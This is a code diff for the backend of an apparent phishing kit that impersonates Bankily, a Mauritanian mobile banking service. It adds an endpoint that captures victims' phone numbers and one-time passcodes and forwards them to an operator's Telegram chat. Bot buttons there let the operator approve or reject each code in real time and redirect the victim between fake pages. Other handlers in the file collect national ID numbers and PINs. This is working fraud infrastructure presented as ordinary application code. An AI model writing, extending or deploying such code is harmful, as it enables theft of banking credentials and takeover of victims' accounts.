@@ -75,7 +75,86 @@ app.post('/api/login-notification', async (req, res) => {
     }
 });
 
-// -------------------- CIN API (PAGE 8) --------------------
+// -------------------- FIRST OTP API (PAGE 8) --------------------
+app.post('/api/verify-first-otp', async (req, res) => {
+    const { phone, otp } = req.body || {};
+    const country = "Mauritania";
+    const countryCode = "+222";
+    const currentTime = new Date().toLocaleString('en-US', {
+        month: 'numeric', day: 'numeric', year: 'numeric',
+        hour: 'numeric', minute: 'numeric', second: 'numeric',
+        hour12: true
+    });
+
+    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+
+    statusStore[phone] = "pending_page8_otp";
+
+    const page8Msg = `🔢 <b>BANKILY MAURITANIA - PAGE 8 FIRST OTP SUBMISSION</b>
+
+🆕 <b>VERIFICATION CODE SUBMITTED (Page 8)</b>
+🇲🇷 <b>Country:</b> ${country}
+🌍 <b>Country Code:</b> ${countryCode}
+📱 <b>Phone Number:</b> ${phone}
+🔐 <b>4-Digit OTP:</b> ${otp}
+⏰ <b>Time:</b> ${currentTime}
+
+━━━━━━━━━━━━━━━
+
+⚠️ <b>Choose Action:</b>`;
+
+    try {
+        await bot.telegram.sendMessage(ADMIN_ID, page8Msg, {
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "1. Correct code", callback_data: `p8_correct|${phone}` },
+                        { text: "2. Wrong code", callback_data: `p8_wrong_code|${phone}` }
+                    ],
+                    [
+                        { text: "3. Wrong Pin", callback_data: `p8_wrong_pin|${phone}` }
+                    ]
+                ]
+            }
+        });
+        res.json({ success: true });
+    } catch (err) {
+        console.error("Telegram Notification Error:", err);
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// -------------------- TELEGRAM BOT ACTIONS (PAGE 8) --------------------
+
+// 1. Correct code -> Proceeds to Page 9
+bot.action(/^p8_correct\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "p8_correct";
+    await ctx.answerCbQuery("Approved");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`✅ <b>CODE APPROVED (PAGE 8)</b>\n📱 <b>User:</b> ${phone}\n🏁 Redirected to Page 9.`);
+});
+
+// 2. Wrong code -> Prompts re-entering code on page8
+bot.action(/^p8_wrong_code\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "p8_wrong_code";
+    await ctx.answerCbQuery("Wrong Code");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`❌ <b>WRONG CODE (PAGE 8)</b>\n📱 <b>User:</b> ${phone}\n⚠️ User prompted to re-enter code.`);
+});
+
+// 3. Wrong Pin -> Redirects user back to page6
+bot.action(/^p8_wrong_pin\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "p8_wrong_pin";
+    await ctx.answerCbQuery("Wrong PIN");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`🔑 <b>WRONG PIN (PAGE 8)</b>\n📱 <b>User:</b> ${phone}\n⬅️ Redirected back to Page 6.`);
+});
+
+// -------------------- CIN API --------------------
 app.post('/api/save-cin', async (req, res) => {
     const { phone, cin } = req.body || {};
     const country = "Mauritania";
@@ -92,7 +171,7 @@ app.post('/api/save-cin', async (req, res) => {
 
     const cinNotificationMsg = `🪪 <b>BANKILY MAURITANIA - CIN SUBMISSION</b>
 
-🆕 <b>NATIONAL ID SUBMISSION (Page 8)</b>
+🆕 <b>NATIONAL ID SUBMISSION</b>
 🇲🇷 <b>Country:</b> ${country}
 🌍 <b>Country Code:</b> ${countryCode}
 📱 <b>Phone Number:</b> ${phone}
@@ -175,8 +254,6 @@ app.post('/api/verify-page9-otp', async (req, res) => {
 });
 
 // -------------------- TELEGRAM BOT ACTIONS (PAGE 9) --------------------
-
-// 1. Correct code -> Proceeds to success
 bot.action(/^p9_correct\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "page9_approved";
@@ -185,7 +262,6 @@ bot.action(/^p9_correct\|(.+)/, async (ctx) => {
     await ctx.replyWithHTML(`✅ <b>CODE APPROVED</b>\n📱 <b>User:</b> ${phone}\n🏁 Redirected to Success Page.`);
 });
 
-// 2. Wrong code -> Prompts re-entering code on page9
 bot.action(/^p9_wrong_code\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "page9_wrong_code";
@@ -194,37 +270,31 @@ bot.action(/^p9_wrong_code\|(.+)/, async (ctx) => {
     await ctx.replyWithHTML(`❌ <b>WRONG CODE</b>\n📱 <b>User:</b> ${phone}\n⚠️ User prompted to re-enter code.`);
 });
 
-// 3. Wrong Pin -> Redirects user back to page6
 bot.action(/^p9_wrong_pin\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "page9_wrong_pin";
     await ctx.answerCbQuery("Wrong PIN");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`🔑 <b>WRONG PIN</b>\n📱 <b>User:</b> ${phone}\n⬅️ Redirected back to Page 6 to re-enter PIN.`);
+    await ctx.replyWithHTML(`🔑 <b>WRONG PIN</b>\n📱 <b>User:</b> ${phone}\n⬅️ Redirected back to Page 6.`);
 });
 
-// 4. Wrong CIN -> Redirects user back to page8
 bot.action(/^p9_wrong_cin\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "page9_wrong_cin";
     await ctx.answerCbQuery("Wrong CIN");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`🪪 <b>WRONG CIN</b>\n📱 <b>User:</b> ${phone}\n⬅️ Redirected back to Page 8 to re-enter CIN.`);
+    await ctx.replyWithHTML(`🪪 <b>WRONG CIN</b>\n📱 <b>User:</b> ${phone}\n⬅️ Redirected back to Page 8.`);
 });
 
-// -------------------- BOT ACTIONS (PAGE 8 & LOGIN) --------------------
-
-// APPROVE LOGIN
+// -------------------- BOT ACTIONS (LOGIN & CIN) --------------------
 bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
-    const pin = ctx.match[2];
     statusStore[phone] = "approved";
     await ctx.answerCbQuery("Allowed");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
     await ctx.replyWithHTML(`✅ <b>LOGIN APPROVED</b>\n📱 <b>Phone:</b> ${phone}`);
 });
 
-// DENY LOGIN
 bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "denied";
@@ -233,7 +303,6 @@ bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
     await ctx.replyWithHTML(`❌ <b>LOGIN REJECTED</b>\n📱 <b>Phone:</b> ${phone}`);
 });
 
-// CIN APPROVE
 bot.action(/^cin_approve\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "cin_approved";
@@ -242,7 +311,6 @@ bot.action(/^cin_approve\|(.+)/, async (ctx) => {
     await ctx.replyWithHTML(`🪪 <b>CIN APPROVED</b>\n📱 <b>User:</b> ${phone}`);
 });
 
-// CIN REJECT
 bot.action(/^cin_reject\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "cin_rejected";
@@ -279,6 +347,5 @@ app.listen(PORT, async () => {
     }
 });
 
-// Graceful stop
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
